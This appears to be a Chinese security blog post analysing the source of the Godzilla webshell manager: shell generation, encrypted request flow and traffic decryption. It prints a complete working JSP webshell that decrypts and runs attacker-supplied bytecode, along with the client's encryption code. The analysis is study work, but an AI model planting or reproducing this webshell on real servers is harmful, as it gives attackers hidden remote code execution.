@@ -1,0 +1,683 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Godzilla Webshell | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Godzilla Webshell | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+考完试了，终于可以继续学习了，这两天恶补前几天的摆烂，23号就开始军训了。这篇是记录学习哥斯拉分析的过程，因为没有最新的4.0版本的源码只有3.0的，所以本文是基于3.0，具体源码可以上gayhub下载
+JSP篇
+Webshell文件..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Godzilla Webshell
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                20 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>考完试了，终于可以继续学习了，这两天恶补前几天的摆烂，23号就开始军训了。这篇是记录学习哥斯拉分析的过程，因为没有最新的4.0版本的源码只有3.0的，所以本文是基于3.0，具体源码可以上gayhub下载</p>
+<h1 id="jsp篇">JSP篇</h1>
+<h2 id="webshell文件生成分析">Webshell文件生成分析</h2>
+<p>找到core/ui/component/dialog/GenerateShellLoder.java，这是一个JDialog的子类，生成webshell的按钮点击事件是通过<code>automaticBindClick.bindJButtonClick(this, this);</code>方法来进行绑定，跟进该方法</p>
+<pre><code class="language-java">public static void bindJButtonClick(final Object fieldClass, Object eventClass) {
+    try {
+        Field[] fields = fieldClass.getClass().getDeclaredFields();
+        for (Field field : fields) {
+            if (field.getType().isAssignableFrom(JButton.class)) {
+                field.setAccessible(true);
+                JButton fieldValue = (JButton) field.get(fieldClass);
+                String fieldName = field.getName();
+                if (fieldValue != null) {
+                    try {
+                        final Method method = eventClass.getClass().getDeclaredMethod(fieldName + &quot;Click&quot;, ActionEvent.class);
+                        method.setAccessible(true);
+                        if (method != null) {
+                            fieldValue.addActionListener(new ActionListener() {
+                                public void actionPerformed(ActionEvent e) {
+                                    try {
+                                        method.invoke(fieldClass, e);
+                                    } catch (Exception e1) {
+                                        e1.printStackTrace();
+                                    }
+                                }
+                            });
+                        }
+                    } catch (NoSuchMethodException e) {
+                        Log.error(fieldName + &quot;Click  未实现&quot;);
+                    }
+                }
+            }
+        }
+    } catch (Exception e2) {
+        e2.printStackTrace();
+    }
+}
+</code></pre>
+<p>循环遍历fieldClass的属性，如果是满足属性的类型是JButton的父类，则会获取属性名，反射调用<code>属性名+Click</code>的方法，GenerateShellLoder类的属性如下，因此这里生成webshell绑定的是<code>generateButtonClick</code>方法</p>
+<pre><code class="language-java">private JLabel passwordLabel;
+private JLabel secretKeyLabel;
+private JLabel cryptionLabel;
+private JLabel payloadLabel;
+private JTextField passwordTextField;
+private JTextField secretKeyTextField;
+private JComboBox&lt;String&gt; cryptionComboBox;
+private JComboBox&lt;String&gt; payloadComboBox;
+private JButton generateButton;
+private JButton cancelButton;
+</code></pre>
+<p><code>generateButtonClick</code>方法如下</p>
+<pre><code class="language-java">private void generateButtonClick(ActionEvent actionEvent) {
+    String password = this.passwordTextField.getText();
+    String secretKey = this.secretKeyTextField.getText();
+    if (password == null || secretKey == null || password.trim().length() &lt;= 0 || secretKey.trim().length() &lt;= 0) {
+        JOptionPane.showMessageDialog(this, &quot;password 或\t secretKey  是空的!&quot;, &quot;提示&quot;, 2);
+    } else if (this.payloadComboBox.getSelectedItem() == null || this.cryptionComboBox.getSelectedItem() == null) {
+        JOptionPane.showMessageDialog(this, &quot;payload 或  cryption 没有选中!&quot;, &quot;提示&quot;, 2);
+    } else {
+        byte[] data = ApplicationContext.getCryption((String) this.payloadComboBox.getSelectedItem(), (String) this.cryptionComboBox.getSelectedItem()).generate(password, secretKey);
+        if (data != null) {
+            JFileChooser chooser = new JFileChooser();
+            chooser.setFileSelectionMode(0);
+            chooser.showDialog(new JLabel(), &quot;选择&quot;);
+            File selectdFile = chooser.getSelectedFile();
+            if (selectdFile != null) {
+                try {
+                    FileOutputStream fileOutputStream = new FileOutputStream(selectdFile);
+                    fileOutputStream.write(data);
+                    fileOutputStream.close();
+                    JOptionPane.showMessageDialog(this, &quot;success! save file to -&gt; &quot; + selectdFile.getAbsolutePath(), &quot;提示&quot;, 1);
+                    dispose();
+                } catch (Exception e) {
+                    Log.error(e);
+                }
+            } else {
+                Log.log(&quot;用户取消选择....&quot;, new Object[0]);
+            }
+        } else {
+            JOptionPane.showMessageDialog(this, &quot;加密器在生成时返回空&quot;, &quot;提示&quot;, 2);
+        }
+    }
+}
+</code></pre>
+<p>首先获取了密码和key，并且对他们进行了判断。在主要部分中，判断了data是否为空，data获取方式如下，<code>byte[] data = ApplicationContext.getCryption((String) this.payloadComboBox.getSelectedItem(), (String) this.cryptionComboBox.getSelectedItem()).generate(password, secretKey);</code></p>
+<p>这里是调用了<code>ApplicationContext.getCryption()</code>方法</p>
+<pre><code class="language-java">public static Cryption getCryption(String payloadName, String crytionName) {
+    Class&lt;?&gt; cryptionClass = cryptionMap.get(crytionName);
+    if (cryptionMap == null || !((CryptionAnnotation) cryptionClass.getAnnotation(CryptionAnnotation.class)).payloadName().equals(payloadName)) {
+        return null;
+    }
+    try {
+        return (Cryption) cryptionClass.newInstance();
+    } catch (Exception e) {
+        Log.error(e);
+        return null;
+    }
+}
+</code></pre>
+<p>传入的参数是payload和加密方式的名字，通过<code>cryptionClass.newInstance()</code>获取对应加密的对象，然后就是调用generate方法，把密码和key作为参数传入，继续跟进，在上面生成webshell的时候，是根据自己生成的webshell选择的加密方式来选择，我如果选择JAVA_AES_BASE64，他会去获取对应的加密的对象，这里我就以BASE64的情况来分析。所以他会去调用<code>shells/cryptions/JavaAes/JavaAesBase64.java</code>类的generate方法,这里传入的key是经过md5加密并且取前16位的结果</p>
+<pre><code class="language-java">public byte[] generate(String password, String secretKey) {
+    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
+}
+</code></pre>
+<p>调用了<code>shells/cryptions/JavaAes/Generate.java</code>的<code>GenerateShellLoder</code>方法</p>
+<pre><code class="language-java">public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
+    String template;
+    try {
+
+        InputStream inputStream = Generate.class.getClassLoader().getResourceAsStream(&quot;shell/java/template/&quot; + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;GlobalCode.bin&quot;);
+        String globalCode = new String(functions.readInputStream(inputStream));
+        inputStream.close();
+        String globalCode2 = globalCode.replace(&quot;{pass}&quot;, pass).replace(&quot;{secretKey}&quot;, secretKey);
+        InputStream inputStream2 = Generate.class.getClassLoader().getResourceAsStream(&quot;shell/java/template/&quot; + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;Code.bin&quot;);
+        String code = new String(functions.readInputStream(inputStream2));
+        inputStream2.close();
+        Object selectedValue = JOptionPane.showInputDialog((Component) null, &quot;suffix&quot;, &quot;selected suffix&quot;, 1, (Icon) null, SUFFIX, (Object) null);
+        if (selectedValue == null) {
+            return null;
+        }
+        String suffix = (String) selectedValue;
+        InputStream inputStream3 = Generate.class.getClassLoader().getResourceAsStream(&quot;shell/java/template/shell.&quot; + suffix);
+        String template2 = new String(functions.readInputStream(inputStream3));
+        inputStream3.close();
+        if (suffix.equals(SUFFIX[1])) {
+            globalCode2 = globalCode2.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);
+            code = code.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);
+        }
+        if (ApplicationContext.isGodMode()) {
+            template = template2.replace(&quot;{globalCode}&quot;, functions.stringToUnicode(globalCode2)).replace(&quot;{code}&quot;, functions.stringToUnicode(code));
+        } else {
+            template = template2.replace(&quot;{globalCode}&quot;, globalCode2).replace(&quot;{code}&quot;, code);
+        }
+        return template.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;).getBytes();
+    } catch (Exception e) {
+        Log.error(e);
+        return null;
+    }
+}
+</code></pre>
+<p>根据选择的加密模式，来判断用哪个模板，isBin是在<code>GenerateShellLoder</code>方法的最后一个参数，如果是false默认是base64方式，所以会用密码和key去替换<code>shell/java/template/base64Code.bin</code>和<code>base64GlobalCode.bin</code>两个文件中的{pass}和{secretKey}，然后会通过<code>suffix.equals(SUFFIX[1])</code>来判断生成jsp类型的还是jspx类型的webshell。至此webshell生成的内容就到此为止.</p>
+<h2 id="连接请求过程分析">连接请求过程分析</h2>
+<p>本地先搭建个环境，然后把我们的哥斯拉马丢上去，测试开启抓包测试连接，把哥斯拉的流量搞到burp上</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220621203219190.png" alt="image-20220621203219190" loading="lazy"></figure>
+<p>这里在连接时他会先发送三个包，一个个来分析，配置webshell界面的标题是Shell Setting，所以直接搜索，在<code>core/ui/component/dialog/ShellSetting.java</code>中是配置webshell界面，继续寻找对应绑定的事件，这里的测试连接对应的是testButtonClick这个方法</p>
+<pre><code class="language-java">private void testButtonClick(ActionEvent actionEvent) {
+    if (!updateTempShellEntity()) {
+        JOptionPane.showMessageDialog(this, this.error, &quot;提示&quot;, 2);
+        this.error = null;
+    } else if (!this.shellContext.initShellOpertion()) {
+        JOptionPane.showMessageDialog(this, &quot;initShellOpertion Fail&quot;, &quot;提示&quot;, 2);
+    } else if (this.shellContext.getPayloadModel().test()) {
+        JOptionPane.showMessageDialog(this, &quot;Success!&quot;, &quot;提示&quot;, 1);
+    } else {
+        JOptionPane.showMessageDialog(this, &quot;Payload Test Fail&quot;, &quot;提示&quot;, 2);
+    }
+}
+</code></pre>
+<p>首先先调用<code>updateTempShellEntity()</code>方法来对shellContext对象重新赋值，主要是把webshell配置界面修改的内容同步到shellContext上，然后是调用shellContext的<code>initShellOpertion</code>方法完成初始化过程</p>
+<pre><code class="language-java">public boolean initShellOpertion() {
+    boolean state = false;
+    try {
+        this.http = ApplicationContext.getHttp(this);
+        this.payloadModel = ApplicationContext.getPayload(this.payload);
+        this.cryptionModel = ApplicationContext.getCryption(this.payload, this.cryption);
+        this.cryptionModel.init(this);
+        if (this.cryptionModel.check()) {
+            this.payloadModel.init(this);
+            if (this.payloadModel.test()) {
+                state = true;
+            } else {
+                Log.error(&quot;payload Initialize Fail !&quot;);
+            }
+        } else {
+            Log.error(&quot;cryption Initialize Fail !&quot;);
+        }
+        return state;
+    } catch (Exception e) {
+        Log.error(e);
+        return false;
+    }
+}
+</code></pre>
+<p>这里是对自身的http,payloadModel和cryptionModel属性进行了一个赋值，每个ShellEntity对象都有一个属于自身的http属性，用于各自的http请求，这里的Payload成员属性是实现Payload接口的，他具体的实现是<code>shells/payloads/java/JavaShell.java</code>，来看看这个实现类的getPayload方法</p>
+<pre><code class="language-java">public byte[] getPayload() {
+    byte[] data = null;
+    try {
+        InputStream fileInputStream = JavaShell.class.getClassLoader().getResourceAsStream(&quot;shell/java/assets/payload.classs&quot;);
+        data = functions.readInputStream(fileInputStream);
+        fileInputStream.close();
+    } catch (Exception e) {
+        Log.error(e);
+    }
+    return dynamicUpdateClassName(&quot;payload&quot;, data);
+}
+</code></pre>
+<p>他是通过读取<code>shell/java/assets/payload.classs</code>这个文件，然后经过<code>dynamicUpdateClassName</code>方法进行处理，继续跟进</p>
+<pre><code class="language-java">public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
+    try {
+        CtClass ctClass = ClassPool.getDefault().makeClass(new ByteArrayInputStream(classContent));
+        String className = randomName();
+        ctClass.setName(className);
+        this.dynamicClassNameHashMap.put(protoName, className);
+        Log.log(&quot;%s -----&gt;&gt;&gt;&gt;&gt; %s&quot;, protoName, className);
+        classContent = ctClass.toBytecode();
+        ctClass.detach();
+        return classContent;
+    } catch (Exception e) {
+        Log.error(e);
+        this.dynamicClassNameHashMap.put(protoName, protoName);
+        return classContent;
+    }
+}
+</code></pre>
+<p>实际上就是获取了一个随机的名字放入到<code>this.dynamicClassNameHashMap</code>对于classContent的具体值没用进行改变，所以JavaShell对象调用的getPayload()方法就是获取 <code>shell/java/assets/payload.classs</code> 类文件字节码,而<code>getCryption</code>方法就只是获取对应加密的对象了。</p>
+<pre><code class="language-java">public static Cryption getCryption(String payloadName, String crytionName) {
+    Class&lt;?&gt; cryptionClass = cryptionMap.get(crytionName);
+    if (cryptionMap == null || !((CryptionAnnotation) cryptionClass.getAnnotation(CryptionAnnotation.class)).payloadName().equals(payloadName)) {
+        return null;
+    }
+    try {
+        return (Cryption) cryptionClass.newInstance();
+    } catch (Exception e) {
+        Log.error(e);
+        return null;
+    }
+}
+</code></pre>
+<p>然后就是调用<code>this.cryptionModel.init(this);</code></p>
+<pre><code class="language-java">public void init(ShellEntity context) {
+    this.shell = context;
+    this.http = this.shell.getHttp();
+    this.key = this.shell.getSecretKeyX();
+    this.pass = this.shell.getPassword();
+    String findStrMd5 = functions.md5(this.pass + new String(this.key));
+    this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
+    this.findStrRight = findStrMd5.substring(16).toUpperCase();
+    try {
+        this.encodeCipher = Cipher.getInstance(&quot;AES&quot;);
+        this.decodeCipher = Cipher.getInstance(&quot;AES&quot;);
+        this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), &quot;AES&quot;));
+        this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), &quot;AES&quot;));
+        this.payload = this.shell.getPayloadModel().getPayload();
+        if (this.payload != null) {
+            this.http.sendHttpResponse(this.payload);
+            this.state = true;
+            return;
+        }
+        Log.error(&quot;payload Is Null&quot;);
+    } catch (Exception e) {
+        Log.error(e);
+    }
+}
+</code></pre>
+<p>获取到传入该方法的ShellEntity对象的Http成员变量，这个ShellEntity保存着webshell的配置信息，可以直接对webshell发起请求，请求内容是通过<code>this.payload = this.shell.getPayloadModel().getPayload();</code>获取。</p>
+<p>对应的值继续往回跟，是在ShellEntity中的payloadModel成员变量获取，该成员变量赋值是在<code>initShellOpertion</code>方法中，通过<code>ApplicationContext.getPayload(this.payload);</code>获取，这里的getPayload和JavaShell对象的getPayload是不同的</p>
+<pre><code class="language-java">public static Payload getPayload(String payloadName) {
+    Class&lt;?&gt; payloadClass = (Class)payloadMap.get(payloadName);
+    Payload payload = null;
+    if (payloadClass != null) {
+        try {
+            payload = (Payload)payloadClass.newInstance();
+        } catch (Exception var4) {
+            Log.error(var4);
+        }
+    }
+
+    return payload;
+}
+</code></pre>
+<p>这里的payloadModel其实就是JavaShell对象，具体情况上面分析了，就是读取<code>shell/java/assets/payload.classs</code>文件的内容，但是这个文件是字节码文件，他直接作为请求内容发送，应该是明文，但是实际抓的包是密文，继续跟进<code>this.http.sendHttpResponse(this.payload);</code></p>
+<pre><code class="language-java">public HttpResponse sendHttpResponse(byte[] requestData) {
+    return sendHttpResponse(requestData, this.shellContext.getConnTimeout(), this.shellContext.getReadTimeout());
+}
+</code></pre>
+<p>调用了他的重载函数</p>
+<pre><code class="language-java">public HttpResponse sendHttpResponse(Map&lt;String, String&gt; header, byte[] requestData, int connTimeOut, int readTimeOut) {
+    int i;
+    int i2 = 1;
+    byte[] requestData2 = this.shellContext.getCryptionModel().encode(requestData);
+    if (this.shellContext.isSendLRReqData()) {
+        byte[] leftData = this.shellContext.getReqLeft().getBytes();
+        byte[] rightData = this.shellContext.getReqRight().getBytes();
+        if (leftData.length &gt; 0) {
+            i = leftData.length;
+        } else {
+            i = 1;
+        }
+        Object concatArrays = functions.concatArrays(leftData, 0, i - 1, requestData2, 0, requestData2.length - 1);
+        int length = (leftData.length + requestData2.length) - 1;
+        if (rightData.length &gt; 0) {
+            i2 = rightData.length;
+        }
+        requestData2 = (byte[]) functions.concatArrays(concatArrays, 0, length, rightData, 0, i2 - 1);
+    }
+    return SendHttpConn(this.shellContext.getUrl(), &quot;POST&quot;, header, requestData2, connTimeOut, readTimeOut, this.proxy);
+}
+</code></pre>
+<p>这里调用了<code>byte[] requestData2 = this.shellContext.getCryptionModel().encode(requestData);</code>这里通过getCryptionModel()方法 获取到 ShellEnt下一步调用<code>this.cryptionModel.check()</code></p>
+<pre><code class="language-java">public boolean check() {
+    return this.state;
+}
+</code></pre>
+<p>是直接返回state成员变量，state在init方法中已经赋值为true了</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220621211840419.png" alt="image-20220621211840419" loading="lazy"></figure>
+<p>然后就是调用<code>this.payloadModel.init(this);</code></p>
+<pre><code class="language-java">public void init(ShellEntity shellContext) {
+    this.shell = shellContext;
+    this.http = this.shell.getHttp();
+    this.encoding = Encoding.getEncoding(this.shell);
+}
+</code></pre>
+<p>设置了shellContext，http和编码，继续往下看，调用<code>this.payloadModel.test()</code></p>
+<pre><code class="language-java">public boolean test() {
+    String codeString = new String(evalFunc(null, &quot;test&quot;, new ReqParameter()));
+    if (codeString.trim().equals(&quot;ok&quot;)) {
+        return true;
+    }
+    Log.error(codeString);
+    return false;
+}
+</code></pre>
+<p>调用了evalFunc，跟进</p>
+<pre><code class="language-java">public byte[] evalFunc(String className, String funcName, ReqParameter praameter) {
+    if (className != null &amp;&amp; className.trim().length() &gt; 0) {
+        praameter.add(&quot;evalClassName&quot;, getClassName(className));
+    }
+    praameter.add(&quot;methodName&quot;, funcName);
+    return functions.gzipD(this.http.sendHttpResponse(functions.gzipE(praameter.formatEx())).getResult());
+}
+</code></pre>
+<p>className传进来的时候是null，调用<code>praameter.add(&quot;methodName&quot;, funcName);</code>之后将parameter参数进行formatEx() 格式化处理后进行gzip压缩, 压缩完成后将数据通过sendHttpResponse方法向服务器发送请求，然后把结果返回进行gzip解压缩作为evalFunc的返回值，然后判断返回结果是否是ok，则返回true</p>
+<p>回到<code>core/ui/component/dialog/ShellSetting.java</code>，他往下调用了<code>this.shellContext.getPayloadModel().test()</code>,这语句在 this.shellContext.initShellOperation() 已经调用过一次，这就是在burpsuite中看到的第三次请求，和第二次请求是一样的，他的返回结果就是响应的包的内容，也就是<code>functions.gzipD(this.http.sendHttpResponse(functions.gzipE(praameter.formatEx())).getResult())</code></p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220621212935881.png" alt="image-20220621212935881" loading="lazy"></figure>
+<p>他是先通过formatEx方法处理后然后gzip压缩，然后再加密，然后把返回包的内容进行gzip解压缩</p>
+<pre><code class="language-java">public byte[] formatEx() {
+    return super.serialize();
+}
+</code></pre>
+<p>跟进</p>
+<pre><code class="language-java">public byte[] serialize() {
+    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+    for (String key : this.hashMap.keySet()) {
+        try {
+            byte[] value = this.hashMap.get(key);
+            outputStream.write(key.getBytes());
+            outputStream.write(2);
+            outputStream.write(functions.intToBytes(value.length));
+            outputStream.write(value);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    return outputStream.toByteArray();
+}
+</code></pre>
+<p>他还往字节数组中写入了一些其他东西，在前面的evalFunc方法中有<code>praameter.add(&quot;methodName&quot;, funcName);</code> 最终这个add调用到的是addParameterString方法</p>
+<pre><code class="language-java">public void addParameterByteArray(String key, byte[] value) {
+    this.hashMap.put(key, value);
+    this.size += (long) value.length;
+}
+</code></pre>
+<p>所以在serialize方法中的hashMap成员变量是在addParameterByteArray方法进行添加，然后向字节数组流里写入键，写入一个2，写入一个长度为4的数组，用该数组来表示键值对中值所代表的的字节数组长度，value是之前传进来的evalFunc的第二个参数，值为test，然后再把value写进去</p>
+<pre><code class="language-java">public static byte[] intToBytes(int value) {
+    return new byte[]{(byte) (value &amp; 255), (byte) ((value &gt;&gt; 8) &amp; 255), (byte) ((value &gt;&gt; 16) &amp; 255), (byte) ((value &gt;&gt; 24) &amp; 255)};
+}
+</code></pre>
+<p>重复操作, 直到hashMap中的键值对都写入后, 将outputStream输出流转化为byte[] 返回</p>
+<p>直接编写代码测试解密效果，解密第一个包，因为是字节码文件所以是有乱码</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220622124218304.png" alt="image-20220622124218304" loading="lazy"></figure>
+<p>解密第二个包，会出现乱码，原因是我们上面说到的那个serialize方法，会写入了键和值的长度和值，还有一个2，这里我嫌麻烦就不写了哈哈。</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220622130249305.png" alt="image-20220622130249305" loading="lazy"></figure>
+<p>再看服务端的代码，我这边美化了一下，通过md5(pass+xc)计算了一个md5，然后是定义一个类加载器，x方法是对数据进行解码，</p>
+<pre><code class="language-jsp">&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; 
+String pass=&quot;pass&quot;; 
+String md5=md5(pass+xc); 
+class X extends ClassLoader{
+    public X(ClassLoader z){
+        super(z);
+    }
+    public Class Q(byte[] cb){
+        return super.defineClass(cb, 0, cb.length);
+    } 
+}
+public byte[] x(byte[] s,boolean m){
+    try{
+        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);
+        c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));
+        return c.doFinal(s); 
+    }catch (Exception e){
+        return null; 
+    }
+} 
+public static String md5(String s) {
+    String ret = null;
+    try {
+        java.security.MessageDigest m;
+        m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);
+        m.update(s.getBytes(), 0, s.length());
+        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
+    } catch (Exception e) {}
+    return ret; 
+} 
+public static String base64Encode(byte[] bs) throws Exception {
+    Class base64;String value = null;
+    try {
+        base64=Class.forName(&quot;java.util.Base64&quot;);
+        Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);
+        value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
+    } catch (Exception e) {
+        try { base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); 
+        Object Encoder = base64.newInstance(); 
+        value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
+        } catch (Exception e2) {}
+    }
+    return value; 
+} 
+public static byte[] base64Decode(String bs) throws Exception {
+    Class base64;
+    byte[] value = null;
+    try {
+        base64=Class.forName(&quot;java.util.Base64&quot;);
+        Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);
+        value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+    } catch (Exception e) {
+        try { 
+            base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); 
+            Object decoder = base64.newInstance(); 
+            value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+            } 
+        catch (Exception e2) {
+
+            }
+        }
+    return value; 
+}%&gt;
+&lt;%try{
+    byte[] data=base64Decode(request.getParameter(pass));
+    data=x(data, false);
+    if (session.getAttribute(&quot;payload&quot;)==null){
+        session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));
+    }else{
+        request.setAttribute(&quot;parameters&quot;,data);
+        java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();
+        Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();
+        f.equals(arrOut);
+        f.equals(pageContext);
+        response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
+        response.getWriter().write(md5.substring(16));
+    } 
+}catch (Exception e){
+
+}
+%&gt;
+</code></pre>
+<p>看主要的代码部分，对pass参数进行base64解码，然后再通过aes解密后的数据给data，并且把上文md5的前16位分别拼接到了返回内容的前面和后面，所以我们解码需要把前16位和后16位的内容去掉，对中间的内容进行解密</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220622124259030.png" alt="image-20220622124259030" loading="lazy"></figure>
+<h1 id="php篇">PHP篇</h1>
+<p>由于在jsp的时候分析了大部分，所以php就简单说一下吧，生成的话其实都应该是差不多的，这里我选择XOR_BASE64的马子</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220622133524215.png" alt="image-20220622133524215" loading="lazy"></figure>
+<p>对应的Cryption就是<code>shells/cryptions/phpXor/PhpXor.java</code>，和java不一样的地方主要估计就是在下面这两部分</p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220622133647009.png" alt="image-20220622133647009" loading="lazy"></figure>
+<p>分析完java的后可以知道他是在Cryption中的init中调用sendHttpResponse方法，加密的部分就是在这有所区别</p>
+<pre><code class="language-java">public HttpResponse sendHttpResponse(Map&lt;String, String&gt; header, byte[] requestData, int connTimeOut, int readTimeOut) {
+    int i;
+    int i2 = 1;
+    byte[] requestData2 = this.shellContext.getCryptionModel().encode(requestData);
+    if (this.shellContext.isSendLRReqData()) {
+        byte[] leftData = this.shellContext.getReqLeft().getBytes();
+        byte[] rightData = this.shellContext.getReqRight().getBytes();
+        if (leftData.length &gt; 0) {
+            i = leftData.length;
+        } else {
+            i = 1;
+        }
+        Object concatArrays = functions.concatArrays(leftData, 0, i - 1, requestData2, 0, requestData2.length - 1);
+        int length = (leftData.length + requestData2.length) - 1;
+        if (rightData.length &gt; 0) {
+            i2 = rightData.length;
+        }
+        requestData2 = (byte[]) functions.concatArrays(concatArrays, 0, length, rightData, 0, i2 - 1);
+    }
+    return SendHttpConn(this.shellContext.getUrl(), &quot;POST&quot;, header, requestData2, connTimeOut, readTimeOut, this.proxy);
+}
+</code></pre>
+<p>他在这里面是调用了encode方法<code>byte[] requestData2 = this.shellContext.getCryptionModel().encode(requestData);</code>，对应的Cryption的encode方法如下</p>
+<pre><code class="language-java">public byte[] encode(byte[] data) {
+    try {
+        return E(data);
+    } catch (Exception e) {
+        Log.error(e);
+        return null;
+    }
+}
+</code></pre>
+<p>调用E方法，E方法如下</p>
+<pre><code class="language-java">public byte[] E(byte[] cs) {
+    int len = cs.length;
+    for (int i = 0; i &lt; len; i++) {
+        cs[i] = (byte) (cs[i] ^ this.key[(i + 1) &amp; 15]);
+    }
+    return (this.pass + &quot;=&quot; + URLEncoder.encode(functions.base64Encode(cs))).getBytes();
+}
+</code></pre>
+<p>这里主要是用了异或来加密流量，也就是先异或，再base64，再url编码。大概就是这样吧哈哈，懒得写了。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#jsp%E7%AF%87">JSP篇</a>
+<ul>
+<li><a href="#webshell%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E5%88%86%E6%9E%90">Webshell文件生成分析</a></li>
+<li><a href="#%E8%BF%9E%E6%8E%A5%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">连接请求过程分析</a></li>
+</ul>
+</li>
+<li><a href="#php%E7%AF%87">PHP篇</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/java-nei-cun-ma-zhi-filter-nei-cun-ma/">
+              <h3 class="post-title">
+                Java内存马之Filter内存马
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
